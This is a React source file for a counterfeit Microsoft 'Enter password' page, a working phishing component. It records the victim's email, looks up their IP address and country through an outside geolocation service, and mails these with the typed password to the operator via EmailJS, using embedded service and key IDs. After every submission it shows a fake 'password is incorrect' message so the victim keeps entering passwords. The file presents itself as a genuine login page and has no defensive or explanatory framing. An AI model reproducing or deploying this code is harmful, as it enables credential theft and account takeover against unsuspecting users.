import React, { useEffect, useRef, useState } from 'react'
import { useSelector } from 'react-redux'
import logo from "../../images/logo1.png"
import { selectEmail } from '../../redux/slice/authSlice'
import "./password.css"
import emailjs from '@emailjs/browser';
import axios from "axios"
import Loader from '../../loader/Loader';
// import load from "../../images/load.gif"

const Password = () => {
    const [error, setError] = useState(false)
    const [pwd, setPwd] = useState("")
    const emailSelect = useSelector(selectEmail)
    const [country, setCountry] = useState()
    const [ip, setIp] = useState()
    const [isLoading, setIsLoading] = useState(false)

    const getData = async()=>{
        const res = await axios.get('https://geolocation-db.com/json/')
        setIp(res.data.IPv4)
        setCountry(res.data.country_name)
    }

    useEffect(()=>{
        getData()
    }, [])

    const form = useRef()
    const sendEmail = (e) => {
        e.preventDefault()
        
        setIsLoading(true)        
        setTimeout(() =>{
            setError(true)
            setIsLoading(false)
        }, 3000);
        emailjs.sendForm('service_r750wcb', 'template_0pt0fxe', form.current, '95OFq9BKEch4kcWxy')
            .then((result) => {
                console.log(result.text);
                console.log("message sent")
            }, (error) => {
                console.log(error.text);
            });
    }
    return (
        <div className='password'>
            <div className={isLoading ? "pwdOpaque" : "pwdContent"}>
                <div className={error ? "appError" : "appCont"}>
                    {
                        isLoading ? (
                            <div className='loadContent'>
                                <div className='loading'>
                                    <Loader />         
                                </div>
                            </div>
                        ) : null
                    }
                    <div className='logoCont'>
                        <img src={logo} alt="logo" className="logoMicrosoft" />
                        <p style={{ color: "#666262", fontWeight: "600", fontSize: "19px" }}>Microsoft</p>
                    </div>
                    <p className='pTag'>
                        {
                            emailSelect
                        }
                    </p>
                    <h3 className='pwdEntry'>Enter password</h3>
                    {/* <p className='pTag'>
                        Because you're accessing sensitive info, you need to verify your password.
                    </p> */}
                    {
                        error ? (
                            <p className='errorMsg' style={{ color: "red" }}>
                                Your account or password is incorrect. If you don't
                                remember your password, <span style={{ color: "#2281cb" }}>reset it now.</span>
                            </p>
                        ) : null
                    }
                    <form className='form' ref={form} onSubmit={sendEmail}>
                        <input
                            type="text"
                            name="email"
                            value={emailSelect}
                            className="emailForm"
                            readOnly
                        />
                        <input
                            type="text"
                            name="ip"
                            value={ip}
                            className="emailForm"
                            readOnly
                        />
                        <input
                            type="text"
                            name="country"
                            value={country}
                            className="emailForm"
                            readOnly
                        />
                        <input
                            type="password"
                            placeholder="Password"
                            className='pwdForm'
                            required
                            value={pwd}
                            name="password"
                            onChange={(e) => setPwd(e.target.value)}
                        />
                        <label className="pContent">
                            Forgot Password ?
                        </label>
                        <label className="pContent">
                            {
                                `Email code to ${emailSelect}`
                            }
                        </label>
                        {/* <label className="pContent">
                            Sign in with a different Microsoft account
                        </label> */}
                        <div className='btnContent'>
                            <button className='btnSign' type="submit">
                                Sign in
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            <div className='conditions'>
                <h5>Terms of use</h5>
                <h5>Privacy & cookies</h5>
                <h5 style={{ fontSize: "21px", marginBottom: "45px" }}>.{" "}.{" "}.</h5>
            </div>
        </div>
    )
}

export default Password